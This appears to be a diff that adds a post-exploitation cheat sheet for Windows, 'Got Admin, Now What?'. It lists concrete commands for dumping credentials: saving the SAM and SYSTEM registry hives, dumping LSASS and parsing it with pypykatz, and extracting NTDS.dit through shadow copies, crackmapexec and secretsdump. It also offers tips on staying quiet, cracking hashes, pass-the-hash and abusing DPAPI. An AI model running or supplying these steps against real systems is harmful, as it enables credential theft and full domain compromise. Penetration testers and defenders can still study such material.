@@ -1,0 +1,79 @@
+🔥 "Got Admin, Now What?" – Order of Operations
+✅ 1. Check Privileges
+Are you local admin or domain admin?
+
+You can still dump SAM and LSASS with local admin, but NTDS requires domain admin.
+
+🧠 Step 1: Dump SAM + SYSTEM
+Why? Fast and easy — gives you local user hashes.
+
+Command:
+
+cmd
+Copy
+Edit
+reg.exe save hklm\sam C:\sam.save
+reg.exe save hklm\system C:\system.save
+Transfer and use:
+
+bash
+Copy
+Edit
+secretsdump.py -sam sam.save -system system.save LOCAL
+When? Do this first. Quick win, low noise, easy lateral creds.
+
+🧠 Step 2: Dump LSASS
+Why? Potential for plaintext creds, NT hashes, DPAPI keys, Kerberos tickets.
+
+Method: rundll32, task manager GUI, or procdump if AV isn’t screaming.
+
+Transfer and:
+
+bash
+Copy
+Edit
+pypykatz lsa minidump /path/to/lsass.dmp
+When? After SAM. Good mix of plaintext and hash extraction.
+
+🧠 Step 3: Dump NTDS.dit
+Why? You own the entire domain at this point.
+
+Requires:
+
+Domain Admin rights
+
+Shadow copy + copy NTDS.dit and SYSTEM hive
+
+Or use:
+
+bash
+Copy
+Edit
+crackmapexec smb <IP> -u admin -p pass --ntds
+When? Last — biggest file, most sensitive, highest reward. Don’t do this unless you’re quiet or don’t care about detection.
+
+🧊 TL;DR Flow for Your Notes
+markdown
+Copy
+Edit
+## Got Admin? 🪓 Dump Priority Order
+
+1. 🧂 **SAM + SYSTEM**
+   - `reg.exe save hklm\sam C:\sam.save`
+   - `reg.exe save hklm\system C:\system.save`
+   - Offline crack w/ `secretsdump.py`
+
+2. 🧠 **LSASS**
+   - GUI (Task Manager) or `rundll32` dump
+   - Parse with `pypykatz`
+   - Get plaintext creds, hashes, DPAPI keys
+
+3. 👑 **NTDS.dit**
+   - Needs Domain Admin
+   - Use VSS: `vssadmin create shadow /for=C:`
+   - Copy `NTDS.dit` from shadow, dump with `secretsdump.py` or `cme --ntds`
+
+### Tip:
+✅ Crack what you can  
+✅ PtH what you can’t  
+✅ DPAPI what they forgot
